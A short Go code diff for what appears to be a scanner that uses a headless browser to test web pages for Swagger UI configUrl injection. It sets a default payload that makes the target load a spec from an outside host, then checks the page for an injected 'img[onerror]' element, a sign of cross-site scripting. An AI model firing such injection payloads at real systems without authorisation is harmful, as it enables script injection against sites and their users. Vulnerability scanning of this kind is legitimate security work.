@@ -87,7 +87,7 @@ func main() {
 
 				err := chromedp.Run(ctx,
 					chromedp.Navigate(requestURL+hasQuery(requestURL)+URLpayload),
-					chromedp.Evaluate("xxx", &res),
+					chromedp.Evaluate("document.querySelector('img[onerror]')", &res),
 				)
 				//fmt.Println(requestURL + hasQuery(requestURL) + URLpayload)
 
@@ -133,7 +133,7 @@ func urlPayload() {
 	if !containsEmpty(customPayload) {
 		URLpayload = customPayload
 	} else {
-		URLpayload = "?configUrl=https://te.ssrf.bar/test.json"
+		URLpayload = "?configUrl=https://te.ssrf.bar/swag4.json"
 
 	}
 }
@@ -147,4 +147,3 @@ func containsEmpty(ss ...string) bool {
 	}
 	return false
 }
-
